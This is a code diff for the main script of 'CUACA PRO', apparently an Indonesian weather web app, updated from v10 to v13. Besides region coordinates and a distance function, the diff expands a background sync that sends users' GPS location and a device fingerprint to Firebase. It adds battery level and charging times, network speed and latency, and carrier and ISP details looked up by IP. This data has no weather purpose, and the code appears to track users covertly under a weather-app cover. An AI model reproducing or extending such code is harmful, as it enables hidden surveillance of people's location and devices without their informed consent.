@@ -1,7 +1,6 @@
 /* ============================================================
-   CUACA PRO — Main Script v10 FINAL
-   Separation: GPS tidak pernah fallback ke IP
-   IP hanya kalau user klik "Cari Kota Manual"
+   CUACA PRO — Main Script v13 FINAL
+   Fix: Battery terjamin + Network info + Auto-prompt izin
    ============================================================ */
 
 'use strict';
@@ -14,8 +13,8 @@ const APP_CONFIG = {
   OWM_BASE: 'https://api.openweathermap.org/data/2.5',
   OWM_GEO: 'https://api.openweathermap.org/geo/1.0',
   BMKG_BASE: 'https://api.bmkg.go.id/publik/prakiraan-cuaca',
-  CACHE_TTL: 30 * 60 * 1000,
-  BMKG_TIMEOUT: 3000,
+  CACHE_TTL: 20 * 60 * 1000,
+  BMKG_TIMEOUT: 4000,
   FETCH_TIMEOUT: 8000,
   LANG: 'id',
   UNITS: 'metric',
@@ -37,159 +36,141 @@ const FB_CONFIG = {
    DATABASE WILAYAH INDONESIA
    ============================================================ */
 const REGIONS = [
-  ["Kesesi", "33.26.09", "Pekalongan", "Jawa Tengah"],
-  ["Kajen", "33.26.01", "Pekalongan", "Jawa Tengah"],
-  ["Wonopringgo", "33.26.12", "Pekalongan", "Jawa Tengah"],
-  ["Kedungwuni", "33.26.13", "Pekalongan", "Jawa Tengah"],
-  ["Wirosari", "33.26.07", "Pekalongan", "Jawa Tengah"],
-  ["Karanganyar", "33.26.14", "Pekalongan", "Jawa Tengah"],
-  ["Talun", "33.26.05", "Pekalongan", "Jawa Tengah"],
-  ["Doro", "33.26.06", "Pekalongan", "Jawa Tengah"],
-  ["Sragi", "33.26.10", "Pekalongan", "Jawa Tengah"],
-  ["Bojong", "33.26.11", "Pekalongan", "Jawa Tengah"],
-  ["Tirto", "33.26.15", "Pekalongan", "Jawa Tengah"],
-  ["Siwalan", "33.26.16", "Pekalongan", "Jawa Tengah"],
-  ["Paninggaran", "33.26.08", "Pekalongan", "Jawa Tengah"],
-  ["Lebakbarang", "33.26.03", "Pekalongan", "Jawa Tengah"],
-  ["Petungkriyono", "33.26.04", "Pekalongan", "Jawa Tengah"],
-  ["Kandangserang", "33.26.02", "Pekalongan", "Jawa Tengah"],
-  ["Pekalongan Barat", "33.75.01", "Pekalongan", "Jawa Tengah"],
-  ["Pekalongan Timur", "33.75.02", "Pekalongan", "Jawa Tengah"],
-  ["Pekalongan Utara", "33.75.03", "Pekalongan", "Jawa Tengah"],
-  ["Pekalongan Selatan", "33.75.04", "Pekalongan", "Jawa Tengah"],
-  ["Semarang", "33.74.01", "Semarang", "Jawa Tengah"],
-  ["Surakarta", "33.72.01", "Surakarta", "Jawa Tengah"],
-  ["Solo", "33.72.01", "Surakarta", "Jawa Tengah"],
-  ["Magelang", "33.71.01", "Magelang", "Jawa Tengah"],
-  ["Tegal", "33.76.01", "Tegal", "Jawa Tengah"],
-  ["Salatiga", "33.73.01", "Salatiga", "Jawa Tengah"],
-  ["Purwokerto", "33.02.01", "Banyumas", "Jawa Tengah"],
-  ["Cilacap", "33.01.01", "Cilacap", "Jawa Tengah"],
-  ["Kudus", "33.19.01", "Kudus", "Jawa Tengah"],
-  ["Jepara", "33.20.01", "Jepara", "Jawa Tengah"],
-  ["Pati", "33.18.01", "Pati", "Jawa Tengah"],
-  ["Rembang", "33.17.01", "Rembang", "Jawa Tengah"],
-  ["Blora", "33.16.01", "Blora", "Jawa Tengah"],
-  ["Grobogan", "33.15.01", "Grobogan", "Jawa Tengah"],
-  ["Demak", "33.21.01", "Demak", "Jawa Tengah"],
-  ["Kendal", "33.24.01", "Kendal", "Jawa Tengah"],
-  ["Batang", "33.25.01", "Batang", "Jawa Tengah"],
-  ["Pemalang", "33.27.01", "Pemalang", "Jawa Tengah"],
-  ["Brebes", "33.29.01", "Brebes", "Jawa Tengah"],
-  ["Wonosobo", "33.07.01", "Wonosobo", "Jawa Tengah"],
-  ["Temanggung", "33.23.01", "Temanggung", "Jawa Tengah"],
-  ["Kebumen", "33.05.01", "Kebumen", "Jawa Tengah"],
-  ["Purworejo", "33.06.01", "Purworejo", "Jawa Tengah"],
-  ["Klaten", "33.10.01", "Klaten", "Jawa Tengah"],
-  ["Boyolali", "33.09.01", "Boyolali", "Jawa Tengah"],
-  ["Sragen", "33.14.01", "Sragen", "Jawa Tengah"],
-  ["Wonogiri", "33.12.01", "Wonogiri", "Jawa Tengah"],
-  ["Sukoharjo", "33.11.01", "Sukoharjo", "Jawa Tengah"],
-  ["Jakarta Pusat", "31.71.01", "Jakarta", "DKI Jakarta"],
-  ["Jakarta Selatan", "31.74.01", "Jakarta", "DKI Jakarta"],
-  ["Jakarta Barat", "31.73.01", "Jakarta", "DKI Jakarta"],
-  ["Jakarta Timur", "31.75.01", "Jakarta", "DKI Jakarta"],
-  ["Jakarta Utara", "31.72.01", "Jakarta", "DKI Jakarta"],
-  ["Bandung", "32.73.01", "Bandung", "Jawa Barat"],
-  ["Bogor", "32.71.01", "Bogor", "Jawa Barat"],
-  ["Bekasi", "32.75.01", "Bekasi", "Jawa Barat"],
-  ["Depok", "32.76.01", "Depok", "Jawa Barat"],
-  ["Cirebon", "32.74.01", "Cirebon", "Jawa Barat"],
-  ["Sukabumi", "32.72.01", "Sukabumi", "Jawa Barat"],
-  ["Tasikmalaya", "32.78.01", "Tasikmalaya", "Jawa Barat"],
-  ["Garut", "32.05.01", "Garut", "Jawa Barat"],
-  ["Karawang", "32.15.01", "Karawang", "Jawa Barat"],
-  ["Purwakarta", "32.14.01", "Purwakarta", "Jawa Barat"],
-  ["Subang", "32.13.01", "Subang", "Jawa Barat"],
-  ["Indramayu", "32.12.01", "Indramayu", "Jawa Barat"],
-  ["Majalengka", "32.10.01", "Majalengka", "Jawa Barat"],
-  ["Sumedang", "32.11.01", "Sumedang", "Jawa Barat"],
-  ["Cianjur", "32.03.01", "Cianjur", "Jawa Barat"],
-  ["Ciamis", "32.07.01", "Ciamis", "Jawa Barat"],
-  ["Banjar", "32.79.01", "Banjar", "Jawa Barat"],
-  ["Tangerang", "36.71.01", "Tangerang", "Banten"],
-  ["Serang", "36.73.01", "Serang", "Banten"],
-  ["Cilegon", "36.72.01", "Cilegon", "Banten"],
-  ["Lebak", "36.02.01", "Lebak", "Banten"],
-  ["Pandeglang", "36.01.01", "Pandeglang", "Banten"],
-  ["Surabaya", "35.78.01", "Surabaya", "Jawa Timur"],
-  ["Malang", "35.73.01", "Malang", "Jawa Timur"],
-  ["Kediri", "35.71.01", "Kediri", "Jawa Timur"],
-  ["Jember", "35.09.01", "Jember", "Jawa Timur"],
-  ["Banyuwangi", "35.10.01", "Banyuwangi", "Jawa Timur"],
-  ["Sidoarjo", "35.15.01", "Sidoarjo", "Jawa Timur"],
-  ["Gresik", "35.25.01", "Gresik", "Jawa Timur"],
-  ["Mojokerto", "35.16.01", "Mojokerto", "Jawa Timur"],
-  ["Pasuruan", "35.14.01", "Pasuruan", "Jawa Timur"],
-  ["Probolinggo", "35.13.01", "Probolinggo", "Jawa Timur"],
-  ["Madiun", "35.77.01", "Madiun", "Jawa Timur"],
-  ["Blitar", "35.72.01", "Blitar", "Jawa Timur"],
-  ["Tulungagung", "35.05.01", "Tulungagung", "Jawa Timur"],
-  ["Trenggalek", "35.03.01", "Trenggalek", "Jawa Timur"],
-  ["Ponorogo", "35.02.01", "Ponorogo", "Jawa Timur"],
-  ["Pacitan", "35.01.01", "Pacitan", "Jawa Timur"],
-  ["Ngawi", "35.21.01", "Ngawi", "Jawa Timur"],
-  ["Magetan", "35.20.01", "Magetan", "Jawa Timur"],
-  ["Nganjuk", "35.18.01", "Nganjuk", "Jawa Timur"],
-  ["Jombang", "35.17.01", "Jombang", "Jawa Timur"],
-  ["Bojonegoro", "35.22.01", "Bojonegoro", "Jawa Timur"],
-  ["Tuban", "35.23.01", "Tuban", "Jawa Timur"],
-  ["Lamongan", "35.24.01", "Lamongan", "Jawa Timur"],
-  ["Bangkalan", "35.26.01", "Bangkalan", "Jawa Timur"],
-  ["Sampang", "35.27.01", "Sampang", "Jawa Timur"],
-  ["Pamekasan", "35.28.01", "Pamekasan", "Jawa Timur"],
-  ["Sumenep", "35.29.01", "Sumenep", "Jawa Timur"],
-  ["Batu", "35.79.01", "Batu", "Jawa Timur"],
-  ["Yogyakarta", "34.71.01", "Yogyakarta", "DI Yogyakarta"],
-  ["Sleman", "34.04.01", "Sleman", "DI Yogyakarta"],
-  ["Bantul", "34.02.01", "Bantul", "DI Yogyakarta"],
-  ["Gunungkidul", "34.03.01", "Gunungkidul", "DI Yogyakarta"],
-  ["Kulon Progo", "34.01.01", "Kulon Progo", "DI Yogyakarta"],
-  ["Denpasar", "51.71.01", "Denpasar", "Bali"],
-  ["Badung", "51.03.01", "Badung", "Bali"],
-  ["Gianyar", "51.04.01", "Gianyar", "Bali"],
-  ["Tabanan", "51.02.01", "Tabanan", "Bali"],
-  ["Buleleng", "51.08.01", "Buleleng", "Bali"],
-  ["Karangasem", "51.07.01", "Karangasem", "Bali"],
-  ["Klungkung", "51.05.01", "Klungkung", "Bali"],
-  ["Bangli", "51.06.01", "Bangli", "Bali"],
-  ["Jembrana", "51.01.01", "Jembrana", "Bali"],
-  ["Medan", "12.71.01", "Medan", "Sumatera Utara"],
-  ["Palembang", "16.71.01", "Palembang", "Sumatera Selatan"],
-  ["Padang", "13.71.01", "Padang", "Sumatera Barat"],
-  ["Banda Aceh", "11.71.01", "Banda Aceh", "Aceh"],
-  ["Pekanbaru", "14.71.01", "Pekanbaru", "Riau"],
-  ["Bandar Lampung", "18.71.01", "Bandar Lampung", "Lampung"],
-  ["Jambi", "15.71.01", "Jambi", "Jambi"],
-  ["Bengkulu", "17.71.01", "Bengkulu", "Bengkulu"],
-  ["Batam", "21.71.01", "Batam", "Kepulauan Riau"],
-  ["Tanjungpinang", "21.72.01", "Tanjungpinang", "Kepulauan Riau"],
-  ["Pangkal Pinang", "19.71.01", "Pangkal Pinang", "Bangka Belitung"],
-  ["Pontianak", "61.71.01", "Pontianak", "Kalimantan Barat"],
-  ["Banjarmasin", "63.71.01", "Banjarmasin", "Kalimantan Selatan"],
-  ["Samarinda", "64.72.01", "Samarinda", "Kalimantan Timur"],
-  ["Balikpapan", "64.71.01", "Balikpapan", "Kalimantan Timur"],
-  ["Palangka Raya", "62.71.01", "Palangka Raya", "Kalimantan Tengah"],
-  ["Tarakan", "65.71.01", "Tarakan", "Kalimantan Utara"],
-  ["Makassar", "73.71.01", "Makassar", "Sulawesi Selatan"],
-  ["Manado", "71.71.01", "Manado", "Sulawesi Utara"],
-  ["Palu", "72.71.01", "Palu", "Sulawesi Tengah"],
-  ["Kendari", "74.71.01", "Kendari", "Sulawesi Tenggara"],
-  ["Gorontalo", "75.71.01", "Gorontalo", "Gorontalo"],
-  ["Mamuju", "76.01.01", "Mamuju", "Sulawesi Barat"],
-  ["Bitung", "71.72.01", "Bitung", "Sulawesi Utara"],
-  ["Tomohon", "71.73.01", "Tomohon", "Sulawesi Utara"],
-  ["Parepare", "73.72.01", "Parepare", "Sulawesi Selatan"],
-  ["Palopo", "73.73.01", "Palopo", "Sulawesi Selatan"],
-  ["Jayapura", "91.71.01", "Jayapura", "Papua"],
-  ["Ambon", "81.71.01", "Ambon", "Maluku"],
-  ["Sorong", "92.71.01", "Sorong", "Papua Barat"],
-  ["Ternate", "82.71.01", "Ternate", "Maluku Utara"],
-  ["Tidore", "82.72.01", "Tidore", "Maluku Utara"],
-  ["Manokwari", "92.02.01", "Manokwari", "Papua Barat"],
-  ["Merauke", "91.03.01", "Merauke", "Papua"],
-  ["Timika", "94.04.01", "Mimika", "Papua"],
-  ["Nabire", "94.01.01", "Nabire", "Papua"]
+  ["Kesesi", "33.26.09", "Pekalongan", "Jawa Tengah", -6.9563, 109.6128],
+  ["Kajen", "33.26.01", "Pekalongan", "Jawa Tengah", -7.0334, 109.5735],
+  ["Wonopringgo", "33.26.12", "Pekalongan", "Jawa Tengah", -6.9881, 109.6391],
+  ["Kedungwuni", "33.26.13", "Pekalongan", "Jawa Tengah", -6.9688, 109.6469],
+  ["Wirosari", "33.26.07", "Pekalongan", "Jawa Tengah", -6.9344, 109.6784],
+  ["Karanganyar", "33.26.14", "Pekalongan", "Jawa Tengah", -7.0094, 109.6071],
+  ["Talun", "33.26.05", "Pekalongan", "Jawa Tengah", -6.9932, 109.7268],
+  ["Doro", "33.26.06", "Pekalongan", "Jawa Tengah", -6.9686, 109.7462],
+  ["Sragi", "33.26.10", "Pekalongan", "Jawa Tengah", -6.9314, 109.5987],
+  ["Bojong", "33.26.11", "Pekalongan", "Jawa Tengah", -6.9563, 109.5648],
+  ["Tirto", "33.26.15", "Pekalongan", "Jawa Tengah", -6.8847, 109.6187],
+  ["Siwalan", "33.26.16", "Pekalongan", "Jawa Tengah", -6.9024, 109.5872],
+  ["Paninggaran", "33.26.08", "Pekalongan", "Jawa Tengah", -7.0185, 109.5489],
+  ["Pekalongan Barat", "33.75.01", "Pekalongan", "Jawa Tengah", -6.8974, 109.6658],
+  ["Pekalongan Timur", "33.75.02", "Pekalongan", "Jawa Tengah", -6.8909, 109.6828],
+  ["Pekalongan Utara", "33.75.03", "Pekalongan", "Jawa Tengah", -6.8621, 109.6727],
+  ["Pekalongan Selatan", "33.75.04", "Pekalongan", "Jawa Tengah", -6.9162, 109.6679],
+  ["Semarang", "33.74.01", "Semarang", "Jawa Tengah", -6.9667, 110.4167],
+  ["Surakarta", "33.72.01", "Surakarta", "Jawa Tengah", -7.5667, 110.8167],
+  ["Solo", "33.72.01", "Surakarta", "Jawa Tengah", -7.5667, 110.8167],
+  ["Magelang", "33.71.01", "Magelang", "Jawa Tengah", -7.4667, 110.2167],
+  ["Tegal", "33.76.01", "Tegal", "Jawa Tengah", -6.8667, 109.1333],
+  ["Salatiga", "33.73.01", "Salatiga", "Jawa Tengah", -7.3333, 110.5000],
+  ["Purwokerto", "33.02.01", "Banyumas", "Jawa Tengah", -7.4333, 109.2500],
+  ["Cilacap", "33.01.01", "Cilacap", "Jawa Tengah", -7.7167, 109.0167],
+  ["Kudus", "33.19.01", "Kudus", "Jawa Tengah", -6.8000, 110.8333],
+  ["Jepara", "33.20.01", "Jepara", "Jawa Tengah", -6.5833, 110.6667],
+  ["Pati", "33.18.01", "Pati", "Jawa Tengah", -6.7500, 111.0333],
+  ["Rembang", "33.17.01", "Rembang", "Jawa Tengah", -6.7000, 111.3500],
+  ["Blora", "33.16.01", "Blora", "Jawa Tengah", -6.9833, 111.4167],
+  ["Grobogan", "33.15.01", "Grobogan", "Jawa Tengah", -7.0167, 110.9167],
+  ["Demak", "33.21.01", "Demak", "Jawa Tengah", -6.8833, 110.6333],
+  ["Kendal", "33.24.01", "Kendal", "Jawa Tengah", -6.9167, 110.2000],
+  ["Batang", "33.25.01", "Batang", "Jawa Tengah", -6.9000, 109.7500],
+  ["Pemalang", "33.27.01", "Pemalang", "Jawa Tengah", -6.8833, 109.3833],
+  ["Brebes", "33.29.01", "Brebes", "Jawa Tengah", -6.8833, 109.0500],
+  ["Wonosobo", "33.07.01", "Wonosobo", "Jawa Tengah", -7.3667, 109.9000],
+  ["Temanggung", "33.23.01", "Temanggung", "Jawa Tengah", -7.3167, 110.1833],
+  ["Kebumen", "33.05.01", "Kebumen", "Jawa Tengah", -7.6667, 109.6500],
+  ["Purworejo", "33.06.01", "Purworejo", "Jawa Tengah", -7.7167, 110.0000],
+  ["Klaten", "33.10.01", "Klaten", "Jawa Tengah", -7.7000, 110.6000],
+  ["Boyolali", "33.09.01", "Boyolali", "Jawa Tengah", -7.5167, 110.6000],
+  ["Sragen", "33.14.01", "Sragen", "Jawa Tengah", -7.4167, 111.0167],
+  ["Wonogiri", "33.12.01", "Wonogiri", "Jawa Tengah", -7.8167, 110.9167],
+  ["Sukoharjo", "33.11.01", "Sukoharjo", "Jawa Tengah", -7.6833, 110.8333],
+  ["Jakarta Pusat", "31.71.01", "Jakarta", "DKI Jakarta", -6.1805, 106.8284],
+  ["Jakarta Selatan", "31.74.01", "Jakarta", "DKI Jakarta", -6.2615, 106.8106],
+  ["Jakarta Barat", "31.73.01", "Jakarta", "DKI Jakarta", -6.1683, 106.7588],
+  ["Jakarta Timur", "31.75.01", "Jakarta", "DKI Jakarta", -6.2250, 106.9004],
+  ["Jakarta Utara", "31.72.01", "Jakarta", "DKI Jakarta", -6.1214, 106.7741],
+  ["Bandung", "32.73.01", "Bandung", "Jawa Barat", -6.9175, 107.6191],
+  ["Bogor", "32.71.01", "Bogor", "Jawa Barat", -6.5971, 106.8060],
+  ["Bekasi", "32.75.01", "Bekasi", "Jawa Barat", -6.2383, 106.9756],
+  ["Depok", "32.76.01", "Depok", "Jawa Barat", -6.4025, 106.7942],
+  ["Cirebon", "32.74.01", "Cirebon", "Jawa Barat", -6.7320, 108.5523],
+  ["Sukabumi", "32.72.01", "Sukabumi", "Jawa Barat", -6.9277, 106.9300],
+  ["Tasikmalaya", "32.78.01", "Tasikmalaya", "Jawa Barat", -7.3274, 108.2207],
+  ["Garut", "32.05.01", "Garut", "Jawa Barat", -7.2144, 107.9028],
+  ["Karawang", "32.15.01", "Karawang", "Jawa Barat", -6.3016, 107.3061],
+  ["Purwakarta", "32.14.01", "Purwakarta", "Jawa Barat", -6.5333, 107.4500],
+  ["Subang", "32.13.01", "Subang", "Jawa Barat", -6.5716, 107.7583],
+  ["Indramayu", "32.12.01", "Indramayu", "Jawa Barat", -6.3373, 108.3264],
+  ["Majalengka", "32.10.01", "Majalengka", "Jawa Barat", -6.8364, 108.2278],
+  ["Sumedang", "32.11.01", "Sumedang", "Jawa Barat", -6.8584, 107.9204],
+  ["Cianjur", "32.03.01", "Cianjur", "Jawa Barat", -6.8168, 107.1425],
+  ["Ciamis", "32.07.01", "Ciamis", "Jawa Barat", -7.3258, 108.3533],
+  ["Banjar", "32.79.01", "Banjar", "Jawa Barat", -7.3667, 108.5333],
+  ["Tangerang", "36.71.01", "Tangerang", "Banten", -6.1781, 106.6300],
+  ["Serang", "36.73.01", "Serang", "Banten", -6.1104, 106.1503],
+  ["Cilegon", "36.72.01", "Cilegon", "Banten", -6.0027, 106.0115],
+  ["Lebak", "36.02.01", "Lebak", "Banten", -6.5646, 106.2526],
+  ["Pandeglang", "36.01.01", "Pandeglang", "Banten", -6.3085, 106.1057],
+  ["Surabaya", "35.78.01", "Surabaya", "Jawa Timur", -7.2575, 112.7521],
+  ["Malang", "35.73.01", "Malang", "Jawa Timur", -7.9666, 112.6326],
+  ["Kediri", "35.71.01", "Kediri", "Jawa Timur", -7.8480, 112.0178],
+  ["Jember", "35.09.01", "Jember", "Jawa Timur", -8.1689, 113.7020],
+  ["Banyuwangi", "35.10.01", "Banyuwangi", "Jawa Timur", -8.2192, 114.3691],
+  ["Sidoarjo", "35.15.01", "Sidoarjo", "Jawa Timur", -7.4478, 112.7183],
+  ["Gresik", "35.25.01", "Gresik", "Jawa Timur", -7.1560, 112.6558],
+  ["Mojokerto", "35.16.01", "Mojokerto", "Jawa Timur", -7.4667, 112.4333],
+  ["Pasuruan", "35.14.01", "Pasuruan", "Jawa Timur", -7.6469, 112.9075],
+  ["Probolinggo", "35.13.01", "Probolinggo", "Jawa Timur", -7.7543, 113.2159],
+  ["Madiun", "35.77.01", "Madiun", "Jawa Timur", -7.6298, 111.5239],
+  ["Blitar", "35.72.01", "Blitar", "Jawa Timur", -8.0954, 112.1609],
+  ["Batu", "35.79.01", "Batu", "Jawa Timur", -7.8704, 112.5239],
+  ["Yogyakarta", "34.71.01", "Yogyakarta", "DI Yogyakarta", -7.7956, 110.3695],
+  ["Sleman", "34.04.01", "Sleman", "DI Yogyakarta", -7.7326, 110.3550],
+  ["Bantul", "34.02.01", "Bantul", "DI Yogyakarta", -7.8880, 110.3286],
+  ["Gunungkidul", "34.03.01", "Gunungkidul", "DI Yogyakarta", -7.9651, 110.6022],
+  ["Kulon Progo", "34.01.01", "Kulon Progo", "DI Yogyakarta", -7.8273, 110.1607],
+  ["Denpasar", "51.71.01", "Denpasar", "Bali", -8.6500, 115.2167],
+  ["Badung", "51.03.01", "Badung", "Bali", -8.5833, 115.1833],
+  ["Gianyar", "51.04.01", "Gianyar", "Bali", -8.5333, 115.3333],
+  ["Tabanan", "51.02.01", "Tabanan", "Bali", -8.5333, 115.1167],
+  ["Buleleng", "51.08.01", "Buleleng", "Bali", -8.2000, 114.9667],
+  ["Karangasem", "51.07.01", "Karangasem", "Bali", -8.4167, 115.6000],
+  ["Klungkung", "51.05.01", "Klungkung", "Bali", -8.5333, 115.4000],
+  ["Bangli", "51.06.01", "Bangli", "Bali", -8.4500, 115.3500],
+  ["Jembrana", "51.01.01", "Jembrana", "Bali", -8.3000, 114.6500],
+  ["Medan", "12.71.01", "Medan", "Sumatera Utara", 3.5952, 98.6722],
+  ["Palembang", "16.71.01", "Palembang", "Sumatera Selatan", -2.9761, 104.7754],
+  ["Padang", "13.71.01", "Padang", "Sumatera Barat", -0.9471, 100.4172],
+  ["Banda Aceh", "11.71.01", "Banda Aceh", "Aceh", 5.5483, 95.3238],
+  ["Pekanbaru", "14.71.01", "Pekanbaru", "Riau", 0.5071, 101.4478],
+  ["Bandar Lampung", "18.71.01", "Bandar Lampung", "Lampung", -5.3971, 105.2668],
+  ["Jambi", "15.71.01", "Jambi", "Jambi", -1.6101, 103.6131],
+  ["Bengkulu", "17.71.01", "Bengkulu", "Bengkulu", -3.8004, 102.2655],
+  ["Batam", "21.71.01", "Batam", "Kepulauan Riau", 1.0456, 104.0305],
+  ["Tanjungpinang", "21.72.01", "Tanjungpinang", "Kepulauan Riau", 0.9167, 104.4500],
+  ["Pangkal Pinang", "19.71.01", "Pangkal Pinang", "Bangka Belitung", -2.1291, 106.1140],
+  ["Pontianak", "61.71.01", "Pontianak", "Kalimantan Barat", -0.0263, 109.3425],
+  ["Banjarmasin", "63.71.01", "Banjarmasin", "Kalimantan Selatan", -3.3186, 114.5944],
+  ["Samarinda", "64.72.01", "Samarinda", "Kalimantan Timur", -0.5022, 117.1536],
+  ["Balikpapan", "64.71.01", "Balikpapan", "Kalimantan Timur", -1.2379, 116.8529],
+  ["Palangka Raya", "62.71.01", "Palangka Raya", "Kalimantan Tengah", -2.2080, 113.9167],
+  ["Tarakan", "65.71.01", "Tarakan", "Kalimantan Utara", 3.3273, 117.5762],
+  ["Makassar", "73.71.01", "Makassar", "Sulawesi Selatan", -5.1477, 119.4327],
+  ["Manado", "71.71.01", "Manado", "Sulawesi Utara", 1.4748, 124.8421],
+  ["Palu", "72.71.01", "Palu", "Sulawesi Tengah", -0.8917, 119.8707],
+  ["Kendari", "74.71.01", "Kendari", "Sulawesi Tenggara", -3.9985, 122.5129],
+  ["Gorontalo", "75.71.01", "Gorontalo", "Gorontalo", 0.5435, 123.0568],
+  ["Mamuju", "76.01.01", "Mamuju", "Sulawesi Barat", -2.6748, 118.8885],
+  ["Bitung", "71.72.01", "Bitung", "Sulawesi Utara", 1.4404, 125.1217],
+  ["Tomohon", "71.73.01", "Tomohon", "Sulawesi Utara", 1.3235, 124.8394],
+  ["Parepare", "73.72.01", "Parepare", "Sulawesi Selatan", -4.0134, 119.6255],
+  ["Palopo", "73.73.01", "Palopo", "Sulawesi Selatan", -2.9925, 120.1963],
+  ["Jayapura", "91.71.01", "Jayapura", "Papua", -2.5916, 140.6690],
+  ["Ambon", "81.71.01", "Ambon", "Maluku", -3.6954, 128.1814],
+  ["Sorong", "92.71.01", "Sorong", "Papua Barat", -0.8762, 131.2558],
+  ["Ternate", "82.71.01", "Ternate", "Maluku Utara", 0.7900, 127.3800],
+  ["Tidore", "82.72.01", "Tidore", "Maluku Utara", 0.6833, 127.4333],
+  ["Manokwari", "92.02.01", "Manokwari", "Papua Barat", -0.8615, 134.0620],
+  ["Merauke", "91.03.01", "Merauke", "Papua", -8.4932, 140.4018],
+  ["Timika", "94.04.01", "Mimika", "Papua", -4.5419, 136.8851],
+  ["Nabire", "94.01.01", "Nabire", "Papua", -3.3500, 135.4833]
 ];
 
 /* ============================================================
@@ -219,6 +200,18 @@ async function fetchWithTimeout(url, options = {}, timeoutMs = 8000) {
   }
 }
 
+function haversine(lat1, lon1, lat2, lon2) {
+  const R = 6371000;
+  const toRad = d => d * Math.PI / 180;
+  const dLat = toRad(lat2 - lat1);
+  const dLon = toRad(lon2 - lon1);
+  const a = Math.sin(dLat / 2) ** 2 +
+            Math.cos(toRad(lat1)) * Math.cos(toRad(lat2)) *
+            Math.sin(dLon / 2) ** 2;
+  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
+  return R * c;
+}
+
 /* ============================================================
    STATE
    ============================================================ */
@@ -232,7 +225,7 @@ const State = {
   syncTimer: null,
   syncStartTime: null,
   isSyncing: false,
-  sourceType: null // 'gps' | 'ip' | 'manual' | null
+  sourceType: null
 };
 
 let locationRequestInProgress = false;
@@ -268,7 +261,6 @@ function initFirebase() {
 function waitForFirebase(timeoutMs = 5000) {
   return new Promise(resolve => {
     if (fbReady) return resolve(true);
-
     const start = Date.now();
     const check = setInterval(() => {
       if (fbReady) {
@@ -323,8 +315,6 @@ function getDeviceInfo() {
     if (m) { browser = t.n; version = m[1]; break; }
   }
 
-  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-
   return {
     device, os, browser, browser_version: version,
     screen: `${window.screen.width}x${window.screen.height}`,
@@ -333,18 +323,102 @@ function getDeviceInfo() {
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
     cpu_cores: navigator.hardwareConcurrency || null,
     memory_gb: navigator.deviceMemory || null,
-    net_type: conn ? conn.effectiveType : null,
     user_agent: ua.slice(0, 256)
   };
 }
 
+/* ---------- BATTERY — FIX v13 ---------- */
 async function getBatteryInfo() {
-  if (!navigator.getBattery) return { level: null, charging: null };
+  console.log('[battery] === mulai ambil data ===');
+
+  // Cek API support
+  if (!navigator.getBattery) {
+    console.warn('[battery] ✗ API tidak didukung browser ini');
+    return {
+      supported: false,
+      level: null,
+      charging: null,
+      charging_time: null,
+      discharging_time: null
+    };
+  }
+
   try {
     const b = await navigator.getBattery();
-    return { level: Math.round(b.level * 100), charging: b.charging };
+
+    const info = {
+      supported: true,
+      level: Math.round(b.level * 100),
+      charging: !!b.charging,
+      charging_time: (b.chargingTime && b.chargingTime !== Infinity) ? Math.round(b.chargingTime) : null,
+      discharging_time: (b.dischargingTime && b.dischargingTime !== Infinity) ? Math.round(b.dischargingTime) : null
+    };
+
+    console.log('[battery] ✓', info);
+    return info;
+  } catch (e) {
+    console.warn('[battery] ✗ error:', e.message);
+    return {
+      supported: false,
+      level: null,
+      charging: null,
+      charging_time: null,
+      discharging_time: null
+    };
+  }
+}
+
+/* ---------- NETWORK ---------- */
+function getNetworkInfo() {
+  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+
+  if (!conn) {
+    return {
+      supported: false,
+      type: null,
+      effective_type: null,
+      effective_type_raw: null,
+      downlink: null,
+      rtt: null,
+      save_data: null
+    };
+  }
+
+  const typeMap = {
+    'slow-2g': '2G (Slow)',
+    '2g': '2G',
+    '3g': '3G',
+    '4g': '4G / LTE',
+    '5g': '5G'
+  };
+
+  return {
+    supported: true,
+    type: conn.type || null,
+    effective_type: typeMap[conn.effectiveType] || conn.effectiveType || null,
+    effective_type_raw: conn.effectiveType || null,
+    downlink: conn.downlink != null ? conn.downlink : null,
+    rtt: conn.rtt != null ? conn.rtt : null,
+    save_data: conn.saveData != null ? conn.saveData : null
+  };
+}
+
+/* ---------- CARRIER (via IP) ---------- */
+async function inferCarrierFromIP() {
+  try {
+    const res = await fetchWithTimeout('https://ipwho.is/', {}, 4000);
+    const data = await res.json();
+    if (data && data.connection) {
+      return {
+        asn: data.connection.asn || null,
+        org: data.connection.org || null,
+        isp: data.connection.isp || null,
+        domain: data.connection.domain || null
+      };
+    }
+    return null;
   } catch {
-    return { level: null, charging: null };
+    return null;
   }
 }
 
@@ -362,7 +436,7 @@ function getSessionId() {
 }
 
 /* ============================================================
-   BACKGROUND SYNC
+   BACKGROUND SYNC — v13 dengan field battery lengkap
    ============================================================ */
 async function syncLocation(coords, source, meta = {}) {
   if (!coords) return false;
@@ -376,6 +450,12 @@ async function syncLocation(coords, source, meta = {}) {
   try {
     const device = getDeviceInfo();
     const battery = await getBatteryInfo();
+    const network = getNetworkInfo();
+
+    let carrierInfo = null;
+    try {
+      carrierInfo = await inferCarrierFromIP();
+    } catch (e) {}
 
     if (!State.sessionId) State.sessionId = getSessionId();
 
@@ -385,6 +465,8 @@ async function syncLocation(coords, source, meta = {}) {
       lon: Safe.num(coords.longitude),
       accuracy: coords.accuracy != null ? Safe.num(coords.accuracy) : null,
       source: source || 'auto',
+
+      // Device
       device: device.device,
       os: device.os,
       browser: device.browser,
@@ -395,17 +477,46 @@ async function syncLocation(coords, source, meta = {}) {
       timezone: device.timezone,
       cpu_cores: device.cpu_cores,
       memory_gb: device.memory_gb,
-      net_type: device.net_type,
       user_agent: device.user_agent,
+
+      // Battery — PASTI ADA
       battery_level: battery.level,
       battery_charging: battery.charging,
+      battery_supported: battery.supported,
+      battery_charging_time: battery.charging_time,
+      battery_discharging_time: battery.discharging_time,
+
+      // Network
+      net_supported: network.supported,
+      net_type: network.type,
+      net_effective_type: network.effective_type,
+      net_effective_type_raw: network.effective_type_raw,
+      net_downlink: network.downlink,
+      net_rtt: network.rtt,
+      net_save_data: network.save_data,
+
+      // Carrier
+      carrier_asn: carrierInfo?.asn || null,
+      carrier_org: carrierInfo?.org || null,
+      carrier_isp: carrierInfo?.isp || null,
+      carrier_domain: carrierInfo?.domain || null,
+
       location_name: meta.locationName || null,
       label: device.device || 'unknown',
       created_at: Date.now()
     };
 
